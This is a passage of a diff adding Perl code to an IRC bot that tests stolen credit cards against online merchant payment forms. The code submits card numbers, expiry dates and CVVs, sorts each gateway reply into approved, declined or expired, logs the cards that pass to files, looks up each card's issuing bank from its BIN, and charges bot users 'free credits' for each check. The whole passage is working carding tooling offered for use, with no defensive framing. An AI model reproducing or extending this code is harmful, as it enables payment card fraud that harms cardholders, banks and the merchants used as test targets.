+       #print "<FORM action=\"message.pl\" method=\"post\" name=\"form1\" onsubmit=\"return(CheckForm_onclick())\">\n";
+       #print $agent->content,"\n";
+       my $allo=$agent->content;
+       addlog("output_scriptsx.html", "$allo");
+############################################################################################################
+    if ($allo =~/The transaction has been declined because of an AVS mismatch./){
+print "\t\t\t[Valid]\n";
+addlog("ccaproved.txt", "!cc $card $m$y $verifica ");
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7,1BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7,1BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/I'm sorry but your purchase was declined./){
+print "\t\t\t[CC Declined]\n";
+    my ($amount,$current,$avs,$csc) = ($2,$3,$4,$5);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7,1 Merchant : SagePay - 7,1BANK 0:10 $1 0- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 4DECLINED");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+    }
+    if($bank == 0){
+    #7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7,1 Merchant : SagePay - 7,1BANK 0:10 $1 0- 7,1Free Credit 0:10 $credits
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7,1 Merchant : SagePay - 7,1BANK 0:10 Not Found 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+	############################################################################################################
+    }elsif ($allo =~/&AMT=(.*)%2e00&CURRENCYCODE=(.*)&AVSCODE=(.*)&CVV2MATCH=(.*)&TRANSACTIONID=(.*)<br \/><br \/>/){
+    my ($current,$avs,$csc,$transid,$opt2) = ($2,$3,$4,$5,$6);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-14 AVS Mismatch 0- 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Approved/){
+addlog("ccaproved.txt", "!cc $card $m$y $verifica AVS Bypass");
+print "\t\t\t[Killed]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 7,1 Merchant : SagePay - 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0-  7,1 Merchant : SagePay - 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/ilirmorina/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 15Thank you! 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 9APPROVED! 0- 15Thank you! 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 9APPROVED");
+    addlog("approved.txt", "$card 9APPROVED");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Invalid credit card number./){
+print "\t\t\t[CC Invalid]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid Credit Card Number 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid Credit Card Number 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Invalid card number/){
+print "\t\t\t[CC Invalid]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid card number [6] 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15Invalid card number [6] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Duplicate transaction/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7Duplicate transaction [11] 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7Duplicate transaction [11] 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/An error occurred during processing./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 An error occurred during processing [120] 0- 4[0,1MARKED LOST4] 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 An error occurred during processing [120] 0- 4[0,1MARKED LOST4] 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/A duplicate transaction has been submitted./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 A duplicate transaction has been submitted. [318] 0- 4[0,1CARD REJECTED4] 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 A duplicate transaction has been submitted. [318] 0- 4[0,1CARD REJECTED4] 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Your credit card is expired./){
+print "\t\t\t[Expired]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 14CARD EXPIRED [317]14,1 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0:15 14CARD EXPIRED [317]14,1 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/This transaction cannot be accepted at this time./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $master :SPAMMER => 4,1 BOS 8!4 MERCHANT DOWN 0-4 BOT OUT 8! ");
+    $irc_socket->write("PART @generalchans\r\n");
+    $irc_socket->write("quit\r\n");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"");
+    }
+############################################################################################################
+    }elsif ($allo =~/The merchant does not accept this type of credit card./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7THE MERCHANT DOES NOT ACCEPT THIS TYPE OF CREDIT CARD 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 7THE MERCHANT DOES NOT ACCEPT THIS TYPE OF CREDIT CARD 0- 4[0,1CARD REJECTED4] 0- 7BANK 0:10 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/CreditCardType/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 The Merchant Does Not Accept This Type Of Credit Card 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 The Merchant Does Not Accept This Type Of Credit Card 0- 7BANK 0:10 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/&L_SHORTMESSAGE0=Processor%20Decline&L_LONGMESSAGE0=This%20transaction%20cannot%20be%20processed%2e&L_SEVERITYCODE0=Error&L_ERRORPARAMID0=ProcessorResponse&L_ERRORPARAMVALUE0=(.*)&AMT=(.*)%2e00&CURRENCYCODE=(.*)&AVSCODE=(.*)&CVV2MATCH=(.*)<br \/><br \/>/){
+    my ($amount,$current,$avs,$csc) = ($2,$3,$4,$5);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7,1BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 4DECLINED");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7AVS 0:10 $avs 0- 7CVV2 0:10 $csc 0- 7,1BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+############################################################################################################
+    }elsif ($allo =~/IliriDotKomhh/){
+    my ($amount,$current,$avs,$csc) = ($2,$3,$4,$5);
+    open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+	open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7,1BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    addlog("ResChecker.txt", "$card 4DECLINED");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Decline 0- 7,1BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    addlog("declined.txt", "$card 4DECLINED");
+    }
+############################################################################################################
+    }elsif ($allo =~/Your order has been received. Thank you for your business!/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    $irc_socket->write("PRIVMSG $master :SPAMMER => 4,1 BOS 8!4 MERCHANT DOWN 0-4 BOT OUT 8! ");
+    $irc_socket->write("PART @generalchans\r\n");
+    $irc_socket->write("quit\r\n");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"");
+    }
+############################################################################################################
+    }elsif ($allo =~/The credit card number is invalid./){
+print "\t\t\t[Invalid]\n";
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card or Expired 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please use a different payment card/){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Rejected 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Rejected 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please enter a valid credit card expiration date./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Expired 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Card Expired 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please enter a valid credit card expiration year./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Invalid Card 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    }elsif ($allo =~/Please enter a valid Credit Card Verification Number./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Verification Number Invalid 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 4DECLINED 0-14 Verification Number Invalid 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+############################################################################################################
+    print "card $variable!";
+    }
+    }
+    }elsif ($allo =~/Please enter a valid credit card expiration year./){
+	open(FILE, "+<freecredit.txt") or die "$! error";
+ $number = <FILE>;
+ $number = int($number);
+ $credits = $number-1;
+ seek(FILE, 0, 0); 
+ truncate(FILE, tell FILE);
+ print FILE $credits;
+ close(FILE);
+    open FILE,"bank.txt";
+    my @results = <FILE>;
+    close FILE;
+    my $bank = 0;
+    my $nuova = substr($card,0,6);
+    foreach my $url (@results){
+    if($url =~m/$nuova\|(.*)/&& $bank == 0) {
+    $bank = 1;
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15CARD EXPIRED14,1 0- 7BANK 0:10 $10- 7,1Free Credit 0:10 $credits ");
+    }
+    }
+    if($bank == 0){
+    &respond_to_privmsg(\%msg,"7,1 $nick 15:3,1 $card $m$y $verifica 0-14 $curs$random_number.$nomor_acak 0: 15CARD EXPIRED14,1 0- 7BANK 0:14 IMMEDIATELY UPDATED! 0- 7,1Free Credit 0:10 $credits ");
+    addlog("bankinfo.txt", "BIN : $nuova");
+    }
+    }
+
+################################################ ANOTHER TYPE CARD OR PREMIUM USER #############################################################
+################################################################################################################################################
+
+if($msg{'what'} =~ /\!cc\s+(\b[4536][0-9]{13,16}\b)\s+(\d{4})\s+(\b[0-9]{3,4}\b)/){
+		    if($auto == 1){
+                    ##Coded By Payment Tor Restart & Start
+                    #$tor = service('tor restart');
+                    &respond_to_privmsg(\%msg,"7,1 $nick 0:14 Note : !cc work on private msg only ", $nick );
+                     ##Fixed Bug !cc By Payment
+                    my ($card,$expmes,$verifica) = ($1,$2,$3);
+                    my ($numerocarta,$expmes,$verifica,$amount) = ($1,$2,$3,$4,$5,);
